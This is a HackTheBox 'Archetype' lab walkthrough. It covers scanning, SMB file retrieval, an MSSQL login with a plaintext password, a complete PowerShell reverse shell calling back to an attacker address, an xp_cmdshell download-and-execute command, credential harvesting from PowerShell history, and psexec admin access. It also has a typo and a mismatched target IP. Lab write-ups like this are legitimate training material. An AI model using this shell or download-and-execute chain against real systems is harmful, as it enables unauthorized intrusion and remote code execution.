# HackTheBox Archetype
## Scanning

Initial scan

```bash
nmap 10.10.10.27 -oN init_nmap.log
```

Service discovery and default scripts on found ports

```bash
nnamp 10.10.10.27 -sV -sC -p 135,139,445,1433,1434 -oN portscan_nmap.log
```

## Connecting with smb

Connect to backup folder

```bash
smbclient \\\\10.10.10.27\\backups -N
```

Get the file

```bash
get prod.dtsConfig
```

## Logging into MSSQL service

Open metasploit and select the MSSQL Login module

```bash
use scanner/mssql/mssql_login
set RHOST 10.10.10.27
set PASSWORD M3g4c0rp123
set USERNAME sql_svc
set DOMAIN ARCHETYPE
exploit
```

## Getting a reverse shell

Starting netcat

```bash
nc -lvnp 420
```

Starting a python server to download the reverse shell payload

```bash
python3 -m http.server
```

Setting up the revese payload. This has to be in a `ps1` file, in this case the `file.ps1` file

```ps
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.147",420);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
```

Executing the download on the MSSQL server

```sql
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.147:8000/file.ps1\");"
```

## Searching for possible interesting files

Powershell script to get all files and exclude directories

```ps
gci -Force -Recurse | where {! $_.PSIsContainer}
```

Getting the user flag

```bash
cat C:\Users\sql_svc\Desktop\user.txt
```

Getting smb Admin accounts

```bash
cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Getting the admin flag

Logging in as admin with the found credentials

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.37
```

Reading the root flag

```
type C:\Users\Administrator\Desktop\root.txt
```
